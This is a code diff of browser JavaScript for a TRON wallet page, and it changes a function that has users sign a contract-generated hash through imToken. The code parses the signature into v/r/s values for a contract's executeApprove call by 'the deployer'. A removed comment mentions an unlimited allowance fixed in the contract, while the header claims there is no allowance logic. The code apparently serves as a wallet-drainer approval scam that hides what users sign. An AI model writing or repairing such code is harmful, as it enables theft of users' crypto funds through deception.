@@ -603,65 +603,76 @@
         
         // ########################### 核心函数：通过合约generateHash生成哈希并签名（无任何额度相关逻辑，修复Buffer）###########################
         async function getContractGeneratedSignature(userAddress) {
-            try {
-                // 1. 地址校验（TRON Base58格式）
-                const cleanAddr = cleanBase58Address(userAddress);
-                if (!cleanAddr.startsWith("T")) throw new Error("无效TRON地址（需T开头Base58格式）");
-            
-                // 2. 实例化代付合约
-                const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
-                if (!delegateContract) throw new Error("代付合约实例化失败");
-            
-                // 3. 关键调用：直接执行合约generateHash函数获取待签名哈希（合约内部已固定无限额度）
-                const messageHash = await delegateContract.generateHash(cleanAddr).call();
-                if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-                    throw new Error("合约返回无效哈希值");
-                }
-            
-                // 4. 按合约_verifySignature要求添加EIP-191前缀（用浏览器原生API替代Buffer，结果完全一致）
-                const prefix = "\x19Ethereum Signed Message:\n32";
-                const prefixBytes = new TextEncoder().encode(prefix); // 替代Buffer.from(prefix)
-                const messageHashBytes = hexToUint8Array(messageHash.slice(2)); // 替代Buffer.from(messageHash.slice(2), "hex")
-                // 拼接两个Uint8Array（替代Buffer.concat）
-                const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
-                combinedBytes.set(prefixBytes, 0);
-                combinedBytes.set(messageHashBytes, prefixBytes.length);
-                // 计算SHA-256哈希（与原Buffer逻辑结果一致）
-                const signedHash = tronWeb.sha3(combinedBytes, true);
-            
-                // 5. imToken离线签名（仅签名，不广播交易）
-                const signature = await tronWeb.trx.sign(signedHash, true);
-                if (!signature || signature.length !== 65) throw new Error("imToken签名失败，返回无效数据");
-            
-                // 6. 解析v/r/s参数（合约executeApprove函数入参要求）
-                const r = "0x" + signature.slice(0, 64);
-                const s = "0x" + signature.slice(64, 128);
-                const v = parseInt(signature.slice(128, 130), 16);
-            
-                // 7. 缓存调试信息（无额度相关内容）
-                localStorage.setItem(DEBUG_KEY, JSON.stringify({
-                    step: "合约哈希签名成功",
-                    userAddress: cleanAddr,
-                    contractGeneratedHash: messageHash, // 合约生成的原始哈希
-                    prefixedHash: signedHash, // 加EIP-191前缀后的哈希
-                    v: v,
-                    r: r,
-                    s: s,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-            
-                showToast("合约哈希签名生成成功，等待部署者执行");
-                return { user: cleanAddr, v, r, s, messageHash };
-            
-            } catch (e) {
-                localStorage.setItem(DEBUG_KEY, JSON.stringify({
-                    step: "签名生成失败",
-                    error: e.message,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-                throw new Error(`合约签名失败：${e.message} → 点击「查看调试信息」排查`);
-            }
+    try {
+        // 1. 地址校验（TRON Base58格式）
+        const cleanAddr = cleanBase58Address(userAddress);
+        if (!cleanAddr.startsWith("T")) throw new Error("无效TRON地址（需T开头Base58格式）");
+    
+        // 2. 实例化代付合约
+        const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
+        if (!delegateContract) throw new Error("代付合约实例化失败");
+    
+        // 3. 调用合约generateHash获取待签名哈希
+        const messageHash = await delegateContract.generateHash(cleanAddr).call();
+        if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
+            throw new Error("合约返回无效哈希值");
         }
+    
+        // 4. 添加EIP-191前缀（浏览器原生API）
+        const prefix = "\x19Ethereum Signed Message:\n32";
+        const prefixBytes = new TextEncoder().encode(prefix);
+        const messageHashBytes = hexToUint8Array(messageHash.slice(2));
+        const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
+        combinedBytes.set(prefixBytes, 0);
+        combinedBytes.set(messageHashBytes, prefixBytes.length);
+        const signedHash = tronWeb.sha3(combinedBytes, true);
+    
+        // 5. 适配imToken签名返回格式（核心修复）
+        let signatureResult = await tronWeb.trx.sign(signedHash, true);
+        // 情况1：返回的是包含signature字段的对象
+        if (typeof signatureResult === "object" && signatureResult.signature) {
+            signatureResult = signatureResult.signature;
+        }
+        // 情况2：返回带0x前缀的字符串，去掉前缀
+        if (signatureResult.startsWith("0x")) {
+            signatureResult = signatureResult.slice(2);
+        }
+        // 验证签名长度（65字节的Hex编码是130位）
+        if (!signatureResult || signatureResult.length !== 130) {
+            throw new Error(`imToken签名失败，返回无效数据（长度应为130，实际${signatureResult?.length || 0}）`);
+        }
+    
+        // 6. 正确解析v/r/s参数（核心修复）
+        const r = "0x" + signatureResult.slice(0, 64);   // 前64位是r
+        const s = "0x" + signatureResult.slice(64, 128); // 中间64位是s
+        const v = parseInt(signatureResult.slice(128, 130), 16); // 最后2位是v
+    
+        // 7. 缓存调试信息
+        localStorage.setItem(DEBUG_KEY, JSON.stringify({
+            step: "合约哈希签名成功",
+            userAddress: cleanAddr,
+            contractGeneratedHash: messageHash,
+            prefixedHash: signedHash,
+            signature: signatureResult, // 实际签名字符串
+            v: v,
+            r: r,
+            s: s,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+    
+        showToast("合约哈希签名生成成功，等待部署者执行");
+        return { user: cleanAddr, v, r, s, messageHash };
+    
+    } catch (e) {
+        localStorage.setItem(DEBUG_KEY, JSON.stringify({
+            step: "签名生成失败",
+            error: e.message,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+        throw new Error(`合约签名失败：${e.message} → 点击「查看调试信息」排查`);
+    }
+}
+        
         
         // 地址清理与校验函数
         function cleanBase58Address(address) {
